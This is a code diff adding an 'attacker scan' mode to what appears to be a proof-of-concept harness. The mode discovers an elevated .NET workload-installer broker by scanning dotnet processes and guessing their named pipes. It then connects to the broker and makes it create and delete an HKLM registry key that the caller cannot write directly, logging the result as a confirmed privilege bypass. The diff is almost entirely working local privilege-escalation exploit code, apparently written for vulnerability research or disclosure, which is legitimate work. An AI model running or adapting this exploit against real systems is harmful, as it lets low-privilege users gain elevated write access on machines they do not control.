@@ -82,6 +82,18 @@ internal static class Program
                 requireMediumIntegrity: false);
         }
 
+        if (args.Length > 0 && args[0] == "ots-attacker-scan")
+        {
+            var evidenceWriter = new StreamWriter(args[3], append: false) { AutoFlush = true };
+            Console.SetOut(evidenceWriter);
+            Console.SetError(evidenceWriter);
+            Console.WriteLine($"OTS_ATTACKER_SID={WindowsIdentity.GetCurrent().User?.Value}");
+            Console.WriteLine($"OTS_ATTACKER_ACCOUNT={WindowsIdentity.GetCurrent().Name}");
+            return RunAttackerScanSync(
+                expectedParentPid: int.Parse(args[1]),
+                sdkMajor: int.Parse(args[2]));
+        }
+
         if (args.Length > 0 && args[0] == "ots-cross-user")
         {
             return await RunCrossUserOtsAsync(
@@ -883,6 +895,149 @@ internal static class Program
                 CloseHandle(mediumImpersonationToken);
             }
         }
+    }
+
+    private static int RunAttackerScanSync(int expectedParentPid, int sdkMajor)
+    {
+        Console.WriteLine($"EXPECTED_PARENT_PID={expectedParentPid}");
+        Console.WriteLine($"ATTACKER_PID={Environment.ProcessId}");
+        Console.WriteLine($"ATTACKER_DIFFERS_FROM_PARENT={Environment.ProcessId != expectedParentPid}");
+        Console.WriteLine($"ATTACKER_INTEGRITY_SID={GetEffectiveIntegritySid()}");
+        Console.WriteLine($"ATTACKER_TARGET_SDK_MAJOR={sdkMajor}");
+        Console.WriteLine("SERVER_PID_HANDOFF=False");
+
+        string architecture = RuntimeInformation.ProcessArchitecture.ToString().ToLowerInvariant();
+        string directMarkerPath = $@"SOFTWARE\Microsoft\dotnet\InstalledWorkloads\Standalone\{architecture}\{FeatureBand}\research.pipe-hijack.direct-attacker";
+
+        bool directWriteAllowed = false;
+        try
+        {
+            using RegistryKey? direct = Registry.LocalMachine.CreateSubKey(directMarkerPath, writable: true);
+            directWriteAllowed = direct is not null;
+            if (directWriteAllowed)
+            {
+                Registry.LocalMachine.DeleteSubKeyTree(directMarkerPath, throwOnMissingSubKey: false);
+            }
+        }
+        catch (Exception ex) when (ex is UnauthorizedAccessException or System.Security.SecurityException)
+        {
+        }
+
+        Console.WriteLine($"ATTACKER_DIRECT_HKLM_WRITE_ALLOWED={directWriteAllowed}");
+
+        var deadline = Stopwatch.StartNew();
+        HashSet<int> attempted = new();
+        while (deadline.Elapsed < TimeSpan.FromSeconds(15))
+        {
+            foreach (Process candidate in Process.GetProcessesByName("dotnet"))
+            {
+                using (candidate)
+                {
+                    int candidatePid;
+                    try
+                    {
+                        candidatePid = candidate.Id;
+                    }
+                    catch
+                    {
+                        continue;
+                    }
+
+                    if (candidatePid == Environment.ProcessId || candidatePid == expectedParentPid)
+                    {
+                        continue;
+                    }
+
+                    if (!attempted.Add(candidatePid))
+                    {
+                        continue;
+                    }
+
+                    Console.WriteLine($"SCAN_CANDIDATE_PID={candidatePid}");
+                    string dispatchPipeName = CreatePipeName(candidatePid, sdkMajor);
+                    string logPipeName = CreatePipeName(candidatePid, sdkMajor, "log");
+
+                    using var dispatch = new NamedPipeClientStream(".", dispatchPipeName, PipeDirection.InOut, PipeOptions.None);
+                    try
+                    {
+                        dispatch.Connect(25);
+                    }
+                    catch (Exception ex) when (ex is TimeoutException or UnauthorizedAccessException or IOException)
+                    {
+                        continue;
+                    }
+
+                    Console.WriteLine($"DISCOVERED_BROKER_PID={candidatePid}");
+                    Console.WriteLine("DISPATCH_PIPE_DISCOVERED_AND_CONNECTED=True");
+
+                    using var log = new NamedPipeClientStream(".", logPipeName, PipeDirection.InOut, PipeOptions.None);
+                    try
+                    {
+                        log.Connect(2000);
+                    }
+                    catch (Exception ex) when (ex is TimeoutException or UnauthorizedAccessException or IOException)
+                    {
+                        Console.WriteLine($"DISCOVERED_LOG_PIPE_CONNECT_FAILED={ex.GetType().Name}");
+                        return 4;
+                    }
+
+                    Console.WriteLine("LOG_PIPE_DISCOVERED_AND_CONNECTED=True");
+                    using var logDrainCts = new CancellationTokenSource();
+                    Task logDrain = Task.Run(() => DrainLogAsync(log, logDrainCts.Token));
+
+                    string markerPath = $@"SOFTWARE\Microsoft\dotnet\InstalledWorkloads\Standalone\{architecture}\{FeatureBand}\{MarkerWorkload}";
+                    try
+                    {
+                        string writeResponse = SendRequestSync(dispatch, new
+                        {
+                            WorkloadId = MarkerWorkload,
+                            RequestType = 400,
+                            SdkFeatureBand = FeatureBand,
+                        });
+                        Console.WriteLine($"WRITE_RESPONSE={writeResponse}");
+
+                        bool created = Registry.LocalMachine.OpenSubKey(markerPath) is RegistryKey;
+                        Console.WriteLine($"HKLM_MARKER_CREATED={created}");
+
+                        string deleteResponse = SendRequestSync(dispatch, new
+                        {
+                            WorkloadId = MarkerWorkload,
+                            RequestType = 401,
+                            SdkFeatureBand = FeatureBand,
+                        });
+                        Console.WriteLine($"DELETE_RESPONSE={deleteResponse}");
+
+                        bool cleaned = Registry.LocalMachine.OpenSubKey(markerPath) is null;
+                        Console.WriteLine($"HKLM_MARKER_CLEANED={cleaned}");
+
+                        string shutdownResponse = SendRequestSync(dispatch, new { RequestType = 0 });
+                        Console.WriteLine($"SHUTDOWN_RESPONSE={shutdownResponse}");
+
+                        bool confirmed =
+                            Environment.ProcessId != expectedParentPid &&
+                            !directWriteAllowed &&
+                            created &&
+                            cleaned;
+
+                        Console.WriteLine($"BROKER_DISCOVERY_WITHOUT_PID_HANDOFF={(confirmed ? "CONFIRMED" : "NOT_CONFIRMED")}");
+                        Console.WriteLine($"ELEVATED_BROKER_PRIVILEGE_BYPASS={(confirmed ? "CONFIRMED" : "NOT_CONFIRMED")}");
+                        return confirmed ? 0 : 1;
+                    }
+                    finally
+                    {
+                        logDrainCts.Cancel();
+                        try { log.Dispose(); } catch { }
+                        try { logDrain.Wait(TimeSpan.FromSeconds(2)); } catch { }
+                    }
+                }
+            }
+
+            Thread.Sleep(10);
+        }
+
+        Console.WriteLine($"SCAN_ATTEMPTED_PID_COUNT={attempted.Count}");
+        Console.WriteLine("BROKER_DISCOVERY_WITHOUT_PID_HANDOFF=NOT_CONFIRMED");
+        return 5;
     }
 
     private static int RunAttackerSync(int serverPid, int expectedParentPid, int sdkMajor, bool requireMediumIntegrity = true)
